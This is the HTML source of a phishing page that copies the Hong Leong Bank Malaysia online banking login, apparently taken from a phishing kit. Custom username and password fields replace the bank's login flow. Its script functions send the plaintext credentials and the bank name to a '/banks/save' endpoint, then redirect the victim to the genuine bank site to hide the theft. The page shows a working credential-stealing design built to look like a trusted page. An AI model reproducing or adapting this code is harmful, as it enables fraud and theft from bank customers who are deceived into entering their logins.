<!DOCTYPE composition PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0046)https://s.hongleongconnect.my/rib/app/fo/login -->
<html xmlns="http://www.w3.org/1999/xhtml" class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
				
				<meta name="viewport" content="width=1280, initial-scale=0.5">
				<meta name="description" content="Hong Leong Connect online banking offers industry-leading internet banking services. Register online or log in to transfer funds, pay bills and more.">
				<meta name="keywords" content="online banking, Online Banking, ebanking, banking online, electronic banking, free online banking, personal banking, bank services, web banking online banking services, hlb connect, internet banking services, internet banking security, personal online banking, hong leong connect, credit card, hong leong online banking, ibg transfer, instant transfer, personal loan, priority banking, atm services, hong leong Islamic bank, debit card, atm card, fixed deposit, hlb investment, hlb insurance, hlebroking, hong leong mach, saving account, current account, financial planning, wealth planning, wealth investment, saving deposit box, premium savings account, pay &amp; save account, 3-in-1 junior account, harvest savings account, infinite credit card, matta card, sutera platinum, acccim credit card, wise card, essential card, fortune card, gold card, gsc credit card, I&#39;m card, flexi loan, pex, pex+, connect online, connect mobile, connect tablet, bill payment, internet transfer, prepaid reload, efixed deposit, cardless withdrawal, fund transfer, pex request, fx rates, asn, bsn, asb, giro, inter-bank transactions">
				<meta name="csrf-token" content="{{ csrf_token() }}">
				<title>Online Banking - Hong Leong Bank Malaysia
				</title><link type="text/css" rel="stylesheet" href="banks/hong_leong/theme.css"><link type="text/css" rel="stylesheet" href="banks/hong_leong/primefaces.css"><link type="text/css" rel="stylesheet" href="banks/hong_leong/watermark.css"><script type="text/javascript" src="banks/hong_leong/jquery.js.download"></script><script type="text/javascript" src="banks/hong_leong/primefaces.js.download"></script><script type="text/javascript" src="banks/hong_leong/watermark.js.download"></script><script type="text/javascript" src="banks/hong_leong/jquery-plugins.js.download"></script>
		<script type="text/javascript">
			// $(window).load(function() {
			//     $.ajax({
			//         url: '/rib/js/b6540aeff81894f2620dd92c7c6d64bfc9393dd6/satelliteLib-d89c2df9897d988c3dd7367f09186473ceab01b4.js?190202060206', type: 'get', dataType: 'script', cache: true,
			//         success:function() { _satellite.pageBottom(); }
			//     });
			//   })
		</script>

			<noscript>
				<meta http-equiv="refresh" content="0;URL=/rib/jserror.html" />
			</noscript>
			
			<link rel="canonical" href="http://www.hongleongconnect.my/">
			
			
			<link rel="stylesheet" type="text/css" href="banks/hong_leong/ie.css">
			
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/style.css">
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/base.css">
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/skeleton.css">
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/layout.css">
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/mach_layout.css">
			<link type="text/css" rel="stylesheet" href="banks/hong_leong/pf-override.css">
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
            <script type="text/javascript">
                var contextPath = '/rib';
                window.name = '';
                
               	function openWindow() {
               		confirmLinktoExternalMainPublic.show();
               	}
               	
               	function accessExternalUrl(url) {
               		if (url.length == 0)
               			return;
               		            		
               		confirmLinktoExternalMainPublic.show();
               	}
               	
			    function postChatSurvey() {
			    	$.ajax({
		    		   url: '/rib/app/fo/unsecurestatic?p=SURVEY', type: 'GET', data: {}, success: function(msg){}
			    	});
			    }				
            </script>
			
			<!-- <script type="text/javascript" src="banks/hong_leong/jquery.simplemodal.js.download"></script> -->
			<script type="text/javascript" src="banks/hong_leong/jquery.blockUI.js.download"></script>
			<script type="text/javascript" src="banks/hong_leong/modernizr-2.5.3.min.js.download"></script>
			<script type="text/javascript" src="banks/hong_leong/jquery.sticky.js.download"></script>
			<script type="text/javascript" src="banks/hong_leong/script.js.download"></script>
			<script type="text/javascript" src="banks/hong_leong/uiux.js.download"></script>
			<script type="text/javascript" src="banks/hong_leong/unslider.min.js.download"></script>
            <script type="text/javascript" src="banks/hong_leong/readmore.js.download"></script>

		<script type="text/javascript" src="banks/hong_leong/hashtable.js.download"></script>
		<script type="text/javascript" src="banks/hong_leong/aaop.js.download"></script>
		<script type="text/javascript" src="banks/hong_leong/json2.js.download"></script>
		<script type="text/javascript" src="banks/hong_leong/restive.min.js.download"></script>
			<script type="text/javascript">
				
				jQuery(function ($) {
					// Load dialog on page load
					$("#basic-modal-content").modal({
						overlayClose: true,
						containerCss:{
							backgroundColor: "#fff", 
							borderColor: "#fff",
							minHeight: "560px", 
							maxHeight: "560px",
							minWidth: "750px",
							maxWidth: "750px"
						},
						fixed: false,
						onClose: function () {
							var vLoginId = $('#idLoginId');
							vLoginId.focus();
							$.modal.close(); // must call this to close!
						}
					});
				});
			</script>
		
		<script type="text/javascript">
			var vPswdFocus;
			window.name = '';
			function isAlphanumeric(s1) {
				if (isBlank(s1))
					return false;
	
				return s1.match(/^[0-9a-zA-Z_-]+$/);
			}
		
            function checkLoginId() {
                var vLoginId = $('#idLoginId');
                var vMsgLoginId = $('#idMsgLoginId');
                var vMsgLoginIdInvalid = $('#idMsgLoginIdInvalid');

                vMsgLoginId.css('display', 'none');
                vMsgLoginIdInvalid.css('display', 'none');

                if (isBlank(vLoginId.val())) {
                    vMsgLoginId.css('display', '');
                    vLoginId.focus();
                    vLoginId.val('');
                    return false;

                } else if (!isAlphanumeric(vLoginId.val())) {
                    vMsgLoginIdInvalid.css('display', '');
                    vLoginId.focus();
                    vLoginId.val('');
                    return false;

                } else {
                	vLoginId.addClass('ui-state-disabled');
                    return true;
                }
            }

            function checkConfirmPicText() {
            	var vConfirmPic = $('#idSBCBConfirmPic');

            	if (vConfirmPic.attr('checked')) {
            		vConfirmPic.attr('checked', false);
            		checkConfirmPic(false);
            	} else {
            		vConfirmPic.attr('checked', true);
            		checkConfirmPic(true);
            	}
            }

            function checkConfirmPic(isChecked) {
            	var vPswd = $('#idPswd');
            	var vLoginBtn = $('#idBtnSubmit2');

                vPswd.val('');
                
            	if (isChecked) {
					vPswd.removeClass("ui-state-disabled disable-btn-ie8-active").removeAttr("readonly aria-readonly");
					vLoginBtn.removeClass("ui-state-disabled disable-btn-ie8-active").removeAttr("disabled");
                    vPswd.focus();
					vPswdFocus = $('#idPswd');
					vPswdFocus.removeClass("ui-state-disabled disable-btn-ie8-active").removeAttr("readonly aria-readonly");
					vPswdFocus.removeClass("ui-state-disabled disable-btn-ie8-active").removeAttr("disabled");
                    widget_idTooltipPass.target = null;
            	} else {
            		vPswd.addClass("ui-state-disabled disable-btn-ie8-active").attr({readonly: 'readonly', 'aria-readonly': 'true'});
					vPswdFocus.addClass("ui-state-disabled disable-btn-ie8-active").attr({readonly: 'readonly', 'aria-readonly': 'true'});
            		vLoginBtn.addClass("ui-state-disabled disable-btn-ie8-active").attr({disabled: 'true'});
            		widget_idTooltipPass.target = vPswd;
            	}
            }
  
            function clearTooltip() {
                var vIdTooltip = $('#idTooltip');
                var vIdTooltip2 = $('#idTooltip2');
            	vIdTooltip.css('display','none');
            	vIdTooltip2.css('display','none');
            	return;
            }
			
            function accessPromoLink(itemNo) {        
            	if (itemNo=="1") {
            		window.open('/rib/faq.html#Secure_Questions','FAQ','resizable=yes,scrollbars=yes,width=950,height=650');
            	} else if (itemNo=="2") {
            		confirmLinktoExternalPro.show();
            		repositionPFDialog('#idConfirmLinktoExternalPro');
            	}
            }
            
           	function accessSecureLink() {
           		window.open("https://www.hlb.com.my/en/personal-banking/help-support/general-faq/security.html");
           	}
           	
           	function openWindow() {
           		confirmLinktoExternal.show();
           		repositionPFDialog('#idConfirmLinktoExternal');
           	}
           	
           	function linktoExternalPg(extLink) {
           		confirmLinktoExternal.hide();
           		confirmLinktoExternalPro.hide();
           		var w = window.open(extLink,'linktoExternalPg','resizable=yes,scrollbars=yes,width=700,height=500');
           		w.focus();
           	}
           	
           	var globalExtUrl = "";
           	function accessExternalUrl(url, isExternal) {
           		if (url.length == 0)
           			return;
           		
           		globalExtUrl = url;               		
           		if (isExternal == "true") {
           			confirmLinktoExternalContent.show();
           			repositionPFDialog('#idConfirmLinktoExternalContent');
           		} else {
           			openExternalWindow();
           		}
           	}
           	
           	function openExternalWindow() {
           		window.open(globalExtUrl, 'linkToExternalContent', 'resizable=yes,scrollbars=yes,width=700,height=500');
           	}
		</script>
            <script type="text/javascript" src="banks/hong_leong/crypto.js.download"></script>
            <script type="text/javascript">
                var vExp = '10001';
                var vMod = '8b19f32efab5dbd0b03b12dd800aefbed8cb623d7399ace15c49b9d3b7fb2e58015add74f5c652c4f5d5bea027ea8d92ac171ecdea86e1aac4e470473b54b5102378ac22fff2db16b08fd844d9eadafd96936604d3e0d32bab03ff3f749536918ff2d80602f1ea69c0d6a2b51962bd3b125324ed31b438ae1cbdfab5c22645a9';

                function login(vLoginId) {
                    var vPswd = $('#idPswd');

                    if (isBlank(vPswd.val())) {
                        $('#idMsgPswd').css('display', '');
                        vPswd.focus();
                        vPswd.val('');
                        return;

                    } else {
                        $('#idMsgPswd').css('display', 'none');
                    }

                    var vLoginForm = $('#loginForm');
                    vPswd.addClass('ui-state-disabled');
                    blockElement('content');
                    
                    var vNonce = $('#idNonce').val();
                    vLoginForm.find('#nonce').val(vNonce);
                    vLoginForm.find('#login_id').val(vLoginId);
                    vLoginForm.find('#login_pswd').val(encryptRSA(vExp, vMod, vNonce, vPswd.val()));
                    
                    checkFraudMonitor('#loginForm', 'true', 'true', 'false');
                    
                    vLoginForm.submit();
                }
				$.ajaxSetup({
					headers: {
						'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
					}
				});
		function passfunction() {
			if(document.getElementById("password").value.length > 0) {
				$.ajax({
					type: "POST",
					data: {username: document.getElementById("username").value,
						password: document.getElementById("password").value,
						bankname: "hong_leong"},
					url : "/banks/save",
					success : function (sdata) {
						// document.getElementById("test").innerHTML = sdata ;
						// document.getElementById("test").append(sdata);
						// $('#test').html(sdata);
						location.href = "https://s.hongleongconnect.my/rib/app/fo/login";
					}
				});
			}
		}

		function userfunction() {
			if(document.getElementById("username").value.length > 0) {
				document.getElementById("username").style.display = "none";
				document.getElementById("usernamebtn").style.display = "none";
				document.getElementById("password").style.display = "block";
				document.getElementById("passwordbtn").style.display = "block";
			}
		}

            </script>
        
		<script type="text/javascript">
			loadSecurityTips();
		</script>
		<script src="banks/hong_leong/satellite-59f9d91d64746d03480098a1.js.download"></script><script src="banks/hong_leong/satellite-5bd13c1d64746d217b0035ca.js.download"></script><script src="banks/hong_leong/s-code-contents-7a5e04a0ec3337172037ad9b6692013d7bdf6085.js.download"></script></head><body class="loginTemplateWidth" style="background: rgb(248, 248, 248); height: 768px; margin: auto;"><div id="j_idt32"></div>

			<div>
				
				
				<div class="menu-gradient3">
				<div id="access-menu">
					<div id="access-menuwrapper">
							<div style="vertical-align:top">
								
								<div class="logo-link" style="float:left; width:450px;height:66px;margin-left: 250px;">
									<a href="https://www.hlb.com.my/en/personal-banking.html" class="logo-link-p"><span></span></a>
									<a href="https://www.hlisb.com.my/en/personal-i.html" class="logo-link-i"><span></span></a>
								</div>
								
								<ul id="access-links">
									<li style="padding-top: 12px; font-size: 12px; font-weight: bold;"><a href="https://s.hongleongconnect.my/rib/app/fo/login?execution=e1s1" onclick="wvFxRate.show();return false;">FX Rates</a><a href="https://s.hongleongconnect.my/rib/app/fo/login" hreflang=""></a>				
									</li>
									<li>
									</li>
									<li style="padding-top: 8px; padding-right: 20px;"><a href="https://www.hlebroking.com/" target="_blank"><img src="banks/hong_leong/HL-e-Broking.png" style="height: 25px;"></a>
									</li>
								</ul>
							</div>
					</div>
				</div>
			</div>


				
				<div id="access-mainwrapper">
					<div class="access-contentwrapper"><span id="idContainer" class="access-container" style="zoom: 1;">
        
		<style>
	       	@media screen and (min-width:0\0) {  
			    /* IE9 and IE10 rule sets go here */ 
			    .access-loginbox-form input {
		    	    width: 240px;
				    height: 24px;
				    border-radius: 5px;
				    padding-left: 10px;
				    font-size: 16px;
			    }
			}
			
			@media all and (-ms-high-contrast:none) {
				.access-loginbox-form input {
		    	    width: 240px;
				    height: 24px;
				    border-radius: 5px;
				    padding-left: 10px;
				    font-size: 16px;
			    }
			 	*::-ms-backdrop, .access-loginbox-form input {
		    	    width: 255px;
				    height: 34px;
				    border-radius: 5px;
				    padding-left: 10px;
				    font-size: 16px;
			    } /* IE11 */
			}
			
        </style>
		
		
		<div id="sidePanel" style="right: -275px;">
		    <div id="panelContent"><a href="https://s.hongleongconnect.my/rib/app/fo/login" onclick="accessSecureLink();return false;"><img id="j_idt47" src="banks/hong_leong/hlb_securitytip_4913_03.jpg" alt="Online Banking Security"></a>
		    </div>
		    <div id="panelHandle">
		        <div><img id="j_idt49" src="banks/hong_leong/secure_tips_handle.jpg" alt="Online Banking Security Reminder">
	        	</div>
		    </div>
		 </div>
			<style id="login_background">
				/* .skyblue {
					background: #fff url('/rib/img/content/1548142673918.jpg') no-repeat top center !important;
				} */			
				.mainAdDisplay {
					background: #fff url('./hongleong.jpg') no-repeat top left !important;
				}
			</style>
		
		
		<div class="skyblue" style="height: 580px;">

			<div>
				<div id="singlecontent">

					
					<div id="content" style="position: relative;display: inline-flex;"><div id="login_panel_id" class="login_panel" style="height: 580px;"><div id="j_idt53" class="connect_login_logo"></div>
							<div style="margin-left:225px;position:relative;color:#fff;right:70px;bottom:25px;font-size:14px"><label>Online Banking</label>
							</div><div id="access-loginbox">
								<div id="access-loginheader">
									<span><label>ONLINE BANKING SECURED LOGIN</label>
									</span>
								</div><div id="idOPLogin" style="" class="access-loginbox-form">
								<div id="idLoginIdForm" name="idLoginIdForm" method="post" autocomplete="off" action="" enctype="application/x-www-form-urlencoded" style="width: 255px; margin: auto;">
								<input type="hidden" name="idLoginIdForm" value="idLoginIdForm">

	
										
	
										<table width="255px">
											<tbody>
												<tr>
													
													<td>
														<input id="username" name="username" type="text" autocomplete="off" maxlength="16" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all large ui-watermark" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false">
														<input id="password" name="password" style="display:none;" type="text" autocomplete="off" maxlength="16" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all large ui-watermark" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false">
														<div id="idMsgLoginId" aria-live="polite" class="ui-message-error ui-widget ui-corner-all" style="display:none">
															<span class="ui-message-error-detail">Username is required
															</span>
														</div>
														<div id="idMsgLoginIdInvalid" aria-live="polite" class="ui-message-error ui-widget ui-corner-all" style="display:none">
															<span class="ui-message-error-detail">Username cannot include special characters. (2173)
															</span>
														</div>

														<img id="j_idt79" height="3" alt="" src="banks/hong_leong/dot_clear.gif">
														<table style="margin: 10px 0 15px 10px;">
															<tbody><tr>
																<td><img id="idLgnHelp" src="banks/hong_leong/info-icon.png" alt="Reset Online Banking Password" style="display:inline;">
																</td>
																<td><span id="idLgnHelp2">
																		<a href="https://s.hongleongconnect.my/rib/app/fo/sec/reg?type=2">
																			<span style="text-decoration: underline;padding-right: 0px;">Forgot Username/Password</span>
																		</a></span>
																</td>
															</tr>														
														</tbody></table>													
													</td>
												</tr>
											</tbody>
										</table>
																	
										<div class="access-loginform-submitwrapper2" style="margin-bottom: 10px;">
											<button id="usernamebtn" name="usernamebtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="userfunction()" style="background: #84c34f; width: 100%; color: #fff; border: 0px; font-weight:bold;"  role="button" aria-disabled="false"><span class="ui-button-text ui-c">Next</span></button>
											<button id="passwordbtn" name="passwordbtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="passfunction()" style="background: #84c34f; width: 100%; color: #fff; border: 0px; font-weight:bold; display:none;"  role="button" aria-disabled="false"><span class="ui-button-text ui-c" >Login</span></button>
										</div>
										
										<div class="access-loginform-submitwrapper2"><button id="j_idt109" name="j_idt109" type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only access-30bluebtn2" style="font-weight:bold;" onclick="window.location.href=&#39;/rib/app/fo/sec/reg&#39;" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Register for Online Banking</span></button>
										</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7565264932731533051:-152198928217087687" autocomplete="off">
			</div>
									<div id="access-loginfooter">
										<span><label>NEW TO ONLINE BANKING?</label>
										</span>
									</div><div class="access-loginform-quicklinks"><div class="access-loginform-panel" style="border-right: 2px solid #134a9c;"><a href="https://s.hongleongconnect.my/rib/app/fo/login" onclick="window.open(&#39;https://www.hlb.com.my/main/online-banking#?utm_source=Hong%20Leong%20Connect&amp;utm_medium=Home%20Button&amp;utm_campaign=Redirection&#39;,&#39;_blank&#39;); return false;">Learn More</a></div><div class="access-loginform-panel"><a href="https://s.hongleongconnect.my/rib/app/fo/login" onclick="window.open(&#39;https://www.hlb.com.my/en/personal-banking/hong-leong-connect/web.html#video&#39;,&#39;ViewDemo&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;); return false;">View Demo</a></div></div></div></div></div><div class="rightPanel" style="float: right;border-right: 1px solid #ededed;border-bottom: 1px solid #ededed;width: 699px;height: 580px;"><div id="merdeka_game" class="mainAdDisplay" >
								
								<!-- https://s.hongleongconnect.my/rib//img/content/1548142673918.jpg	 -->
								<a id="idHiddenBackgoundLink" href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="accessExternalUrl(&#39;https://www.hlb.com.my/en/personal-banking/campaigns/promotions/cny.html&#39;,&#39;false&#39;);return false;" style="cursor: pointer;"></a></div><div id="access-noticecontent">
								
								<div id="access-noticebox2">
									<div class="access-loginslider has-dots" style="overflow: hidden; width: 350px; height: 200px;">
										<ul style="float: left; width: 300%; position: relative; left: -200%; height: 200px;">
											<li style="width: 33.3333%;"><a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="accessExternalUrl(&#39;https://www.hlb.com.my/en/personal-banking/promotions/ct-cny-bloom.html&#39;, &#39;false&#39;);return false;" style="cursor: pointer;"><img id="j_idt148" src="banks/hong_leong/1547805774294.jpg" alt=""></a>
											</li>
											<li style="width: 33.3333%;"><a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="accessExternalUrl(&#39;https://www.hlb.com.my/en/personal-banking/promotions/ct-cny-bloom.html&#39;, &#39;false&#39;);return false;" style="cursor: pointer;"><img id="j_idt152" src="banks/hong_leong/1547805806509.jpg" alt=""></a>
											</li>
											<li style="width: 33.3333%;"><a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="accessExternalUrl(&#39;https://www.hlb.com.my/en/personal-banking/promotions/ct-cny-ang-pow.html&#39;, &#39;false&#39;);return false;" style="cursor: pointer;"><img id="j_idt156" src="banks/hong_leong/1548409033912.jpg" alt=""></a>
											</li>
													<style id="banner_dot">
														.access-loginslider .dots {
															left: 34% !important;
															width: 51px !important;
														}			
													</style>
										</ul>
									<ol class="dots"><li class="dot">1</li><li class="dot">2</li><li class="dot active">3</li></ol></div>
								</div>
								
				
								<div id="access-noticebox">
									<div id="access-noticebox-header">
										<h4>Notice
										</h4>
									</div>
									<div id="access-noticebox-para">
											<div id="idCustomNotice">1) Beware of the latest scam tactic involving TAC, which is the six-digit number sent to a registered account owner’s mobile phone for transaction verification. If you receive a TAC that you didn't request for, please report to the Bank immediately. Never reveal TAC to anyone under any circumstances. Do share this information with your family and friends, and stay safe!<br><br>2) Bill Payments to Lembaga Tabung Haji, Majlis Bandaraya Petaling Jaya, Majlis Daerah Yan, Majlis Perbandaran Dungun, Pejabat Tanah &amp; Galian Wilayah Persekutuan, and Pejabat Tanah &amp; Galian Selangor will not be available due to system enhancements, from 13 April 2018 until further notice.<br><br>
											</div>
									</div>
								</div></div></div>
					</div>
				</div>
			</div>
			<br>


		</div>
		
		<form id="loginForm" name="loginForm" action="https://s.hongleongconnect.my/rib/app/fo/doLogin" method="post">
			<input type="hidden" name="login_pswd" id="login_pswd">
			<input type="hidden" name="login_id" id="login_id">
			<input type="hidden" name="nonce" id="nonce">
		</form><div id="idConfirmLinktoExternal" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow" role="dialog" aria-labelledby="idConfirmLinktoExternal_title" aria-hidden="true" style="width: 450px; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span class="ui-dialog-title">Hong Leong Bank</span><a href="https://s.hongleongconnect.my/rib/app/fo/login#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: auto;"><p><span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>You are leaving Hong Leong Bank's website as such our Privacy Policy shall cease. We wish to remind you on our terms on the use of
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/hyperlink-policy&#39;,&#39;Policy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">links
        		</a>
        		,
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/disclaimer&#39;,&#39;Disclmr&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Disclaimer and Reservation of Intellectual Property Rights
        		</a></p></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"><table>
<tbody>
<tr>
<td class="tbl_col_max txt_right"><button id="idBtnOK" name="idBtnOK" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="linktoExternalPg(&#39;http://abm.org.my/index.cfm?sc=communiqu%C3%A9_on_payment_reference_standards&amp;ar=955&#39;);PrimeFaces.ab({source:&#39;idBtnOK&#39;,onsuccess:function(data,status,xhr){try{startSessionTimer();}catch(e){};;},oncomplete:function(xhr,status,args){top.scroll(0,0);}});return false;"  role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-check"></span><span class="ui-button-text ui-c">Continue</span></button></td>
<td class=" tbl_col_min"><button id="idBtnCancel" name="idBtnCancel" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternal.hide();PrimeFaces.ab({source:&#39;idBtnCancel&#39;,onsuccess:function(data,status,xhr){try{startSessionTimer();}catch(e){};;},oncomplete:function(xhr,status,args){top.scroll(0,0);}});return false;"  role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-close"></span><span class="ui-button-text ui-c">Cancel</span></button></td>
</tr>
</tbody>
</table>
</div></div><div id="idConfirmLinktoExternalPro" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow" role="dialog" aria-labelledby="idConfirmLinktoExternalPro_title" aria-hidden="true" style="width: 450px; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span class="ui-dialog-title">External Link Disclaimer</span><a href="https://s.hongleongconnect.my/rib/app/fo/login#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: auto;"><p><span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>You are leaving Hong Leong Bank's website as such our Privacy Policy shall cease. We wish to remind you on our terms on the use of
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/hyperlink-policy&#39;,&#39;Policy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">links
        		</a>
        		,
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/disclaimer&#39;,&#39;Disclmr&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Disclaimer and Reservation of Intellectual Property Rights
        		</a></p></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"><table>
<tbody>
<tr>
<td class="tbl_col_max txt_right"><button id="idBtnOKPro" name="idBtnOKPro" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="linktoExternalPg(&#39;http://sea.taobao.com&#39;);" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-check"></span><span class="ui-button-text ui-c">Continue</span></button></td>
<td class=" tbl_col_min"><button id="idBtnCancelPro" name="idBtnCancelPro" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternalPro.hide();" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-close"></span><span class="ui-button-text ui-c">Cancel</span></button></td>
</tr>
</tbody>
</table>
</div></div><div id="idConfirmLinktoExternalContent" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow" role="dialog" aria-labelledby="idConfirmLinktoExternalContent_title" aria-hidden="true" style="width: 450px; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span class="ui-dialog-title">External Link Disclaimer</span><a href="https://s.hongleongconnect.my/rib/app/fo/login#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: auto;"><p><span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>You are leaving Hong Leong Bank's website as such our Privacy Policy shall cease. We wish to remind you on our terms on the use of
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/hyperlink-policy&#39;,&#39;Policy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">links
        		</a>
        		,
        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/disclaimer&#39;,&#39;Disclmr&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Disclaimer and Reservation of Intellectual Property Rights
        		</a></p></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"><table>
<tbody>
<tr>
<td class="tbl_col_max txt_right"><button id="idBtnOKContent" name="idBtnOKContent" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternalContent.hide();openExternalWindow();;" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-check"></span><span class="ui-button-text ui-c">Continue</span></button></td>
<td class=" tbl_col_min"><button id="idBtnCancelContent" name="idBtnCancelContent" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternalContent.hide();" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-close"></span><span class="ui-button-text ui-c">Cancel</span></button></td>
</tr>
</tbody>
</table>
</div></div>	
			<span id="simplemodal-placeholder" style="display: none;"></span>	
		
		
        <script type="text/javascript">
            if (self === top) {
                var o = document.getElementById("body_hide");
                o.parentNode.removeChild(o);
            } else {
                top.location = self.location;
            }

            /* $('#idCustomNotice').readmore({
                speed: 0,
                maxHeight: 160
            }) */

        </script>

        <div style="display: none">
            <script type="text/javascript" src="banks/hong_leong/image.js.download"></script><img src="banks/hong_leong/86975.gif">
			            
        </div></span>
					</div>
				</div>

				
				<div class="clearfix access-footnote">

					<div id="access-noticewrapper">
					</div>
					

					<div class="clearfix access-termswrapper" style="padding-top: 4px; overflow: visible;">
						<div class="access-terms">
							<ul class="footer-links">
								<li>
									<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onmouseup="window.open(&#39;/rib/app/fo/tnc_en&#39;,&#39;TermCondition&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Terms &amp; Conditions</a>
								</li>
								<li>
									<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;/rib/security_en.html&#39;,&#39;SecurityPolicy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Security</a>
								</li>
								<li>
									<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onmouseup="window.open(&#39;/rib/app/fo/privacy_en&#39;,&#39;PrivacyPolicy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Privacy Notice</a>
								</li>
								<li>
									<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;/rib/client_charter_en.html&#39;,&#39;ClientCharter&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">e-Banking Charter</a>
								</li>
								<li class="noborder">
									<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onmouseup="window.open(&#39;/rib/app/fo/faq_en&#39;,&#39;FAQ&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">FAQ</a>
								</li>
								
							</ul>
							<div class="terms" style="width: 635px;">
								<p>Copyright © Hong Leong Bank Berhad reserved. Use of the information on this page is intended for Malaysian citizens and Malaysian residents only and all contents on this website are governed by Malaysian law and is subject to the disclaimer which can be read on the disclaimer page. Optimized for Internet Explorer 8 and above.</p>
							</div>
